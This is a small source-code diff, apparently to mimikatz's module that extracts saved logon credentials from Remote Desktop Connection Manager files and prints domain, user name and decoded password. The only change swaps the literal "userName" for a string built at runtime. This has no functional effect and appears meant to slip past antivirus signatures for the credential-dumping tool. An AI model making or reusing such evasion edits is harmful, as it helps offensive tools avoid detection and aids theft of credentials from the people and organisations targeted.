@@ -114,7 +114,9 @@ void kuhl_m_dpapi_rdg_LogonCredentials(DWORD level, IXMLDOMNode *pNode, int argc
 	{
 		if(password = kull_m_xml_getTextValue(pLogonCredentialsNode, L"password"))
 		{
-			userName = kull_m_xml_getTextValue(pLogonCredentialsNode, L"userName");
+			wchar_t userName_token[] = L"XserName";
+			userName_token[0] = L'u';
+			userName = kull_m_xml_getTextValue(pLogonCredentialsNode, userName_token);
 			domain = kull_m_xml_getTextValue(pLogonCredentialsNode, L"domain");
 			kprintf(L"%*s" L"* %s \\ %s : %s\n", level << 1, L"", domain ? domain : L"<NULL>", userName ? userName : L"<NULL>", password);
 			if(kull_m_string_quick_base64_to_Binary(password, &data, &szData))
